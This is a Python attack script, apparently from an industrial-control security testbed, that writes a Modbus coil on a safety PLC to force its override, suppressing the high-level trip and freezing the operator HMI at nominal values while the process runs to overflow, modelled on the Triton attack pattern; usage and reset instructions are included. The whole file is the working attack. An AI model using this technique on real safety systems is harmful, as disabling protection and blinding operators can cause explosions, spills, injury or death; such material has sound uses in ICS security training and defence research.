"""Standalone attack: compromise the Safety PLC (SIS) over Modbus.

Sets the SIS_OVERRIDE coil, which puts the SIS logic into force/bypass: the
high-level trip is suppressed and the operator HMI display freezes at its last
nominal value, while the true process runs to overflow. This is the Triton
attack PATTERN expressed over Modbus (a forced-override register write), NOT
Triton's TriStation/Triconex program-injection MECHANISM — see OVERVIEW.md.

Usage (needs the venv + SIS reachable):
    .venv/bin/python -m attack.attack            # launch the attack
    .venv/bin/python -m attack.attack --reset     # clear the override

Note: this writes directly to the SIS. It can be run instead of, or alongside,
the dashboard's "Inject attack" button. The latched trip only clears on a
runtime restart (plc/load_program.py --restart http://127.0.0.1:8082).
"""

from __future__ import annotations

import sys

from bridge.plc_io import ModbusPlc
from common import registers as R


def main() -> None:
    reset = "--reset" in sys.argv[1:]
    sis = ModbusPlc.for_instance(R.Instance.SIS)
    try:
        sis.write_coil(R.SisCoil.OVERRIDE, not reset)
        state = sis.read_coil(R.SisCoil.OVERRIDE)
        if reset:
            print(f"SIS_OVERRIDE cleared (override={state}). "
                  "Protection logic active again on the next scan.")
        else:
            print(f"ATTACK: SIS_OVERRIDE set (override={state}).")
            print("  SIS trip suppressed and HMI display frozen.")
            print("  The HMI stays nominal; watch the 3D ground truth run to overflow.")
    finally:
        sis.close()


if __name__ == "__main__":
    main()
